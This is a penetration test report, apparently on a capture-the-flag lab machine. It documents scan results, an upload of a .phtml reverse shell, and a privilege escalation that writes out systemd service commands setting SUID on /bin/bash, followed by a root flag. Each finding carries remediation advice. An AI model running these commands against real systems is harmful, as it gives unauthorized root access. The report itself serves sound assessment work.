# Penetration Test Report

## Executive Summary
On September 17, 2025, a penetration test was conducted on the target IP address 10.10.83.26 (and associated web server at 10.10.88.244:3333) as part of an authorized security assessment. The objective was to identify vulnerabilities, assess their impact, and provide actionable remediation recommendations. The assessment revealed critical vulnerabilities, including an unrestricted file upload vulnerability, misconfigured services, and a privilege escalation flaw, which allowed unauthorized access to the root account. Immediate remediation is strongly recommended to mitigate these risks.

## Scope
- **Target IP**: 10.10.83.26
- **Web Application**: http://10.10.88.244:3333/
- **Testing Type**: External network and web application penetration testing
- **Testing Period**: September 17, 2025
- **Testing Tools**: Nmap, Dirb, Netcat, Manual Exploitation Techniques

## Methodology
The penetration test followed a structured approach:
1. **Reconnaissance**: Network scanning using Nmap to enumerate open ports, services, and operating system details.
2. **Enumeration**: Directory brute-forcing with Dirb to identify accessible web directories and files.
3. **Vulnerability Assessment**: Manual analysis of identified services and web application endpoints.
4. **Exploitation**: Leveraging identified vulnerabilities (e.g., file upload) to gain initial access.
5. **Post-Exploitation**: Privilege escalation to gain root access and retrieve sensitive data.
6. **Reporting**: Documenting findings with risk levels and remediation recommendations.

## Findings

### Finding 1: Exposed Services on Multiple Ports
**Description**: The Nmap scan revealed multiple open ports with potentially vulnerable services, including FTP (vsftpd 3.0.5), SSH (OpenSSH 8.2p1), Samba (smbd 4), Squid HTTP Proxy (4.10), and Apache HTTP Server (2.4.41). Exposed services increase the attack surface, especially if misconfigured or unpatched.

**Evidence**:
- Nmap scan output:
  ```
  PORT     STATE SERVICE     VERSION
  21/tcp   open  ftp         vsftpd 3.0.5
  22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
  139/tcp  open  netbios-ssn Samba smbd 4
  445/tcp  open  netbios-ssn Samba smbd 4
  3128/tcp open  http-proxy  Squid http proxy 4.10
  3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
  ```
- OS: Linux 4.15
- Device Type: General purpose

**Risk Level**: Medium  
**Impact**: Exposed services may allow unauthorized access if vulnerabilities exist or credentials are weak.  
**Remediation**:
- Disable unnecessary services (e.g., FTP, Samba) if not required.
- Restrict access to services like SSH and Samba to specific IP ranges using firewall rules.
- Ensure all services are updated to the latest versions to mitigate known vulnerabilities.

### Finding 2: Unrestricted File Upload Vulnerability
**Description**: The web application at `http://10.10.88.244:3333/internal/` allows unrestricted file uploads, permitting the upload of a malicious `.phtml` reverse shell file to bypass extension restrictions. This vulnerability enabled remote code execution (RCE) and initial access to the system as the `www-data` user.

**Evidence**:
- Dirb scan identified the `/internal/` directory and `/internal/uploads/` endpoint:
  ```
  ==> DIRECTORY: http://10.10.88.244:3333/internal/
  ==> DIRECTORY: http://10.10.88.244:3333/internal/uploads/
  + http://10.10.88.244:3333/internal/index.php (CODE:200|SIZE:525)
  ```
- A malicious `.phtml` file was uploaded to `/internal/uploads/` and triggered via Netcat, establishing a reverse shell.

**Risk Level**: Critical  
**Impact**: Attackers can execute arbitrary code, leading to full system compromise, data theft, or further network attacks.  
**Remediation**:
- Implement strict file upload validation (e.g., whitelist allowed file types, scan uploads for malicious content).
- Disable execution of uploaded files in the web server configuration (e.g., restrict `.phtml` execution).
- Use a Web Application Firewall (WAF) to detect and block malicious uploads.

### Finding 3: Privilege Escalation via Systemd Misconfiguration
**Description**: The `www-data` user was able to create and enable a malicious systemd service to set the SUID bit on `/bin/bash`, allowing privilege escalation to the root user. This indicates insufficient privilege separation and weak system hardening.

**Evidence**:
- Commands executed to create a malicious systemd service:
  ```
  www-data@ip-10-10-88-244:/home/bill$ TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/bash -c "chmod +xs /bin/bash"
  [Install]
  WantedBy=multi-user.target' > $TF
  /bin/systemctl link $TF
  /bin/systemctl enable --now $TF
  ```
- Verification of SUID bit on `/bin/bash`:
  ```
  ls -l /bin/bash
  -rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bash
  ```
- Root access achieved:
  ```
  bash -p
  bash-5.0# cd /root
  bash-5.0# cat root.txt
  a58ff8579f0a9270368d33a9966c7fd5
  ```

**Risk Level**: Critical  
**Impact**: Unauthorized root access allows full control over the system, including data manipulation, persistence, and lateral movement.  
**Remediation**:
- Restrict `www-data` user permissions to prevent interaction with systemd.
- Implement proper privilege separation and least privilege principles.
- Regularly audit system configurations and permissions for SUID binaries.
- Disable or restrict systemd service creation for non-privileged users.

## Recommendations
1. **Patch Management**: Ensure all services (vsftpd, OpenSSH, Samba, Squid, Apache) are updated to their latest versions.
2. **Network Hardening**: Use a firewall to restrict access to non-essential ports (e.g., 21, 139, 445, 3128) and limit SSH access to trusted IPs.
3. **Web Application Security**:
   - Validate and sanitize file uploads to prevent malicious file execution.
   - Disable directory listing for sensitive directories (e.g., `/css/`, `/fonts/`, `/images/`).
   - Harden Apache configuration to prevent execution of unauthorized file types.
4. **System Hardening**:
   - Remove unnecessary SUID/SGID bits from binaries.
   - Restrict `www-data` and other service accounts from modifying system configurations.
   - Implement Mandatory Access Control (e.g., SELinux or AppArmor) to limit process capabilities.
5. **Monitoring and Auditing**: Enable logging and monitoring for critical services and review logs regularly for suspicious activity.

## Conclusion
The penetration test identified critical vulnerabilities that allowed unauthorized access and privilege escalation to the root level. Immediate action is required to address the unrestricted file upload vulnerability and systemd misconfiguration, as these pose significant risks to the system's confidentiality, integrity, and availability. Implementing the recommended remediations will significantly improve the security posture of the target environment.